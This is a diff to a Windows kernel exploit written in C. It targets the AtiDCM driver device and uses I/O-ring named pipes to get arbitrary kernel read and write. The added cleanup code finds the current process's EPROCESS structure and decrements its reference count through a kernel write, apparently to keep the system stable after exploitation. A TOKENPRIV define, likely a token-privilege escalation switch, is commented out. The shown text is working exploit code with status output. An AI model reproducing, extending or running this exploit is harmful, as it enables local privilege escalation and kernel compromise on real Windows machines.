@@ -14,7 +14,7 @@ typedef short CSHORT;
 #define NT_BASE 0xfffff80025a00000
 #define OUTPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitOutput"
 #define INPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitInput"
-#define TOKENPRIV 1
+//#define TOKENPRIV 1
 
 DWORD64 g_ntbase = 0;
 DWORD64 g_kisystemcall64shadow = 0;
@@ -907,6 +907,37 @@ BOOL KWrite(PVOID TargetAddress, PBYTE pValue, SIZE_T size) {
 
 VOID cleanup() {
 
+	auto hProc = OpenProcess(MAXIMUM_ALLOWED, FALSE, GetCurrentProcessId());
+
+	if (hProc != NULL)
+	{
+		auto eproc = GetKAddrFromHandle(hProc);
+		printf("[+] eproc = 0x%p\n", eproc);
+		DWORD64 refCount = NULL;
+		if (KRead((PVOID)((DWORD64)eproc - 0x30), (PBYTE)&refCount, sizeof(DWORD64))) {
+			printf("[+] refCount = 0x%llx\n", refCount);
+			if (refCount > 0) {
+				printf("[*] refCount > 0\n");
+				refCount--;
+				if (KWrite((PVOID)((DWORD64)eproc - 0x30), (PBYTE)&refCount, sizeof(DWORD64))) {
+					printf("[+] refCount decremented\n");
+				}
+				else {
+					printf("[-] Failed to decrement refCount\n");
+				}
+			}
+			else {
+				printf("[*] refCount <= 0\n");
+			}
+		}
+		else {
+			printf("[-] Failed to read refCount\n");
+		}
+	}
+	else {
+		printf("[-] Failed to open handle to current process.\n");
+	}
+
 	auto towrite = malloc(16);
 	memset(towrite, 0x0, 16);
 	printf("[*] Cleaning up...\n");
@@ -969,7 +1000,6 @@ int main()
 {
 //#ifndef _DEBUG
 	DWORD bytesRet = 0;
-
 
 	g_device = CreateFileA(
 		"\\\\.\\AtiDCM",
